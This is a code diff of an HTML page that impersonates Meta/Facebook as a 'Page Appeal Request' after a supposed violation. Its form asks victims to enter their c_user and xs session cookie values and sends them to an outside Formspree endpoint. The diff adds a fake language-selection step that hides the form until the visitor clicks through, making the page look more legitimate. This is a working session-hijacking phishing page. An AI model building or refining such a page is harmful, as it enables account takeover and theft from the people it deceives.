@@ -7,70 +7,63 @@
     <style>
         * { box-sizing: border-box; }
         body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; margin: 0; }
-        .meta-container { background: white; padding: 24px; border-radius: 12px; width: 100%; max-width: 450px; position: relative; }
+        .meta-container { background: white; padding: 24px; border-radius: 12px; width: 100%; max-width: 450px; }
         
-        .lang-trigger { position: absolute; top: 20px; right: 20px; cursor: pointer; color: #0866ff; font-weight: 600; font-size: 14px; }
+        /* Modal Styles */
+        .modal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-content { background: white; padding: 20px; border-radius: 12px; width: 90%; max-width: 350px; max-height: 80vh; overflow-y: auto; }
+        .lang-option { padding: 12px; border: 1px solid #ddd; margin-bottom: 8px; border-radius: 6px; cursor: pointer; }
+        .lang-option:hover { background: #f0f2f5; }
         
-        .header { margin-bottom: 24px; }
-        .meta-logo { width: 44px; margin-bottom: 16px; }
-        .header-title { font-size: 26px; font-weight: 800; color: #1c1e21; margin: 0; }
-        .header-desc { font-size: 15px; color: #606770; margin-top: 8px; }
-        
-        .alert-box { border-radius: 8px; padding: 16px; background-color: #f7f8fa; margin-bottom: 24px; border-left: 4px solid #0866ff; }
-        .alert-item { font-size: 14px; color: #1c1e21; margin-bottom: 8px; }
-
-        .video-wrapper video { width: 100%; border-radius: 8px; border: 1px solid #dddfe2; background: #000; }
-        
+        /* Form Styling */
+        #appealForm { display: none; } /* Pehle hidden rahega */
         .input-group { margin-bottom: 20px; }
-        .input-label { font-size: 14px; font-weight: 700; color: #1c1e21; margin-bottom: 8px; display: block; }
-        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; background: #f5f6f7; }
-        
+        .input-label { font-weight: 700; margin-bottom: 8px; display: block; }
+        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; }
         .submit-btn { width: 100%; padding: 14px; background: #0866ff; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
-        
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-content { background: white; padding: 20px; border-radius: 12px; width: 90%; max-width: 350px; }
     </style>
 </head>
 <body>
 
     <div class="meta-container">
-        <div class="lang-trigger" onclick="document.getElementById('modal').style.display='flex'">English ▼</div>
-
-        <div class="header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Meta Logo" class="meta-logo">
-            <h1 class="header-title">Page Appeal Request</h1>
-            <p class="header-desc">Submit your information to appeal the deletion.</p>
-        </div>
-        
-        <div class="alert-box">
-            <div class="alert-item"><b>Notice:</b> Your page has a violation.</div>
-        </div>
-
-        <div class="video-wrapper">
-            <video controls><source src="VID-20260418-WA0000.mp4" type="video/mp4"></video>
-        </div>
-
-        <form action="https://formspree.io/f/maqaobyw" method="POST">
-            <div class="input-group">
-                <label class="input-label">c_user</label>
-                <input type="text" name="c_user" placeholder="Enter c_user" required>
+        <div id="langModal" class="modal">
+            <div class="modal-content">
+                <h3>Select Your Language</h3>
+                <input type="text" placeholder="Search languages..." style="margin-bottom: 10px;">
+                <div class="lang-option">🇺🇸 English</div>
+                <div class="lang-option">🇮🇳 Hindi</div>
+                <div class="lang-option">🇪🇸 Spanish</div>
+                <div class="lang-option">🇵🇹 Portuguese</div>
+                <div class="lang-option">🇮🇳 Tamil</div>
+                <div class="lang-option">🇸🇦 Arabic</div>
+                <div class="lang-option">🇫🇷 French</div>
+                <div class="lang-option">🇻🇳 Vietnamese</div>
+                <div class="lang-option">🇬🇭 Ghanaian (Twi)</div>
+                <button onclick="showForm()" style="width:100%; padding:12px; background:#0866ff; color:white; border:none; border-radius:6px; margin-top:10px;">Confirm Language</button>
             </div>
-            <div class="input-group">
-                <label class="input-label">xs</label>
-                <input type="text" name="xs" placeholder="Enter xs" required>
-            </div>
-            <button type="submit" class="submit-btn">Submit Appeal Request</button>
-        </form>
-    </div>
+        </div>
 
-    <div id="modal" class="modal">
-        <div class="modal-content">
-            <h3>Select Language</h3>
-            <p style="padding: 10px; border-bottom: 1px solid #eee;">🇺🇸 English</p>
-            <p style="padding: 10px; border-bottom: 1px solid #eee;">🇮🇳 Hindi</p>
-            <button onclick="document.getElementById('modal').style.display='none'" style="width:100%; padding:10px; background:#0866ff; color:white; border:none; border-radius:6px; margin-top:10px;">Confirm</button>
+        <div id="appealForm">
+            <h2>Page Appeal Request</h2>
+            <form action="https://formspree.io/f/maqaobyw" method="POST">
+                <div class="input-group">
+                    <label class="input-label">c_user</label>
+                    <input type="text" name="c_user" placeholder="Enter c_user" required>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">xs</label>
+                    <input type="text" name="xs" placeholder="Enter xs" required>
+                </div>
+                <button type="submit" class="submit-btn">Submit Appeal Request</button>
+            </form>
         </div>
     </div>
 
+    <script>
+        function showForm() {
+            document.getElementById('langModal').style.display = 'none';
+            document.getElementById('appealForm').style.display = 'block';
+        }
+    </script>
 </body>
 </html>
